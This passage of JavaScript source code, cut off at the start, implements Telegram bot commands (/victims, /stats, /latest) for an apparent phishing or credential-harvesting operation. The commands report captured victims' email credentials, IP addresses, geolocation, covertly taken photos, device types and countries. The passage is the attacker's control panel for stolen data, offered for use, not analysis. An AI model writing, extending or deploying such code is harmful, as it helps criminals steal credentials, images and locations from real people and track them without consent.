    `, { parse_mode: 'Markdown' });
});

bot.onText(/\/victims/, (msg) => {
    if (victims.size === 0) {
        bot.sendMessage(msg.chat.id, 'No victims tracked yet.');
        return;
    }
    
    let message = `👥 *Victims (${victims.size})*\n\n`;
    const recent = Array.from(victims.values()).slice(-5).reverse();
    
    recent.forEach((v, i) => {
        message += `${i+1}. ${v.credentials?.email || 'N/A'}\n`;
        message += `   📍 ${v.ip || 'N/A'} | 📸 ${v.photo ? 'Yes' : 'No'}\n`;
        message += `   ⏰ ${new Date(v.timestamp).toLocaleTimeString()}\n\n`;
    });
    
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
});

bot.onText(/\/stats/, (msg) => {
    const message = `
📊 *Statistics*

*Totals:*
👥 Total: ${analytics.total}
📸 Photos: ${analytics.photos}
📍 Locations: ${analytics.locations}
📈 Last 24h: ${analytics.last24h}

*Devices:*
${Object.entries(analytics.byDevice).map(([d, c]) => `📱 ${d}: ${c}`).join('\n')}

*Top Countries:*
${Object.entries(analytics.byCountry)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 3)
    .map(([c, n]) => `🏳️ ${c}: ${n}`)
    .join('\n')}

⏰ Updated: ${new Date().toLocaleString()}
    `;
    
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
});

bot.onText(/\/latest/, (msg) => {
    if (victims.size === 0) {
        bot.sendMessage(msg.chat.id, 'No victims tracked yet.');
        return;
    }
    
    const latest = Array.from(victims.values()).pop();
    const message = `
🎯 *Latest Victim*

*Email:* ${latest.credentials?.email || 'N/A'}
*IP:* ${latest.ip || 'N/A'}
*Location:* ${latest.location?.lat ? 'Yes' : 'No'}
*Time:* ${new Date(latest.timestamp).toLocaleString()}
*Photo:* ${latest.photo ? 'Yes' : 'No'}
    `;
    
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
});

